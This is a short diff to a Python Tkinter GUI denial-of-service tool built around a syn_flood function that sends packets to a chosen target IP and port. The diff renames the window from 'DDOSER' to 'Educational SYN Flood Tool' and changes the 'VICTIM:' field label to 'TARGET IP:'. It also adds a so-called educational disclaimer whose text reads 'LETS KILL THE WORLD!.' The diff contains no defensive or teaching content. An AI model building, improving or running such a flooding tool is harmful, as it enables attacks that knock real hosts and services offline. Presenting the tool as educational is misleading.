@@ -4,6 +4,11 @@ import threading
 import random
 import time
 
+# Educational disclaimer message
+DISCLAIMER = """
+LETS KILL  THE WORLD!.
+"""
+
 def syn_flood(target_ip, target_port, packet_rate):
     """Performs a SYN flood attack by sending packets at a specified rate."""
     while True:
@@ -36,7 +41,7 @@ def start_attack():
 
 # Set up the GUI window
 window = tk.Tk()
-window.title("DDOSER")
+window.title("Educational SYN Flood Tool")
 window.geometry("450x300")
 
 # Disclaimer section
@@ -44,7 +49,7 @@ disclaimer_label = tk.Label(window, text=DISCLAIMER, fg="red", wraplength=400, j
 disclaimer_label.pack(pady=10)
 
 # Add labels and entry fields
-ip_label = tk.Label(window, text="VICTIM:")
+ip_label = tk.Label(window, text="TARGET IP:")
 ip_label.pack(pady=5)
 ip_entry = tk.Entry(window)
 ip_entry.pack(pady=5)
